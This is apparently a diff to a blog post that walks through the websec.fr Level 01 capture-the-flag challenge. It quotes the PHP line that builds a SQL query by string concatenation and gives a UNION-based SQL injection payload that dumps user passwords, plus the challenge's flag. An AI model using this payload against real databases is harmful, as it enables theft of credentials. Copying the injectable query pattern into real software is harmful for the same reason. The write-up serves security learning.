@@ -1,7 +1,7 @@
 +++
 title = 'Websec.fr Level 01'
 date = 2025-12-10T00:00:00+01:00
-draft = true
+draft = false
 tags = ['websec']
 +++
 
@@ -53,5 +53,32 @@ if (isset ($_POST['submit']) && isset ($_POST['user_id'])) {
 </html>
 
 ```
-The problem here is this line `$query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';`
-it's a **sqli** 
+The **problem** here is this line `$query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';` it's a **sqli** .
+
+![alt text](/images/stc/levelone.png)
+
+So for any number between `1` and `3` we have a `username`, and our mission is to display a `password` who can be a flag.
+
+For 1 :
+```md
+id -> 1
+username -> levelone
+```
+For 2 :
+```md
+id -> 2
+username -> jvoisin
+```
+
+For 3 :
+
+```md
+id -> 3
+username -> ExampleUser
+```
+
+The payload is : `1 UNION SELECT id, password FROM users`
+
+![alt text](/images/stc/flag-levelone.png)
+
+Flag : `WEBSEC{Simple_SQLite_Injection}`
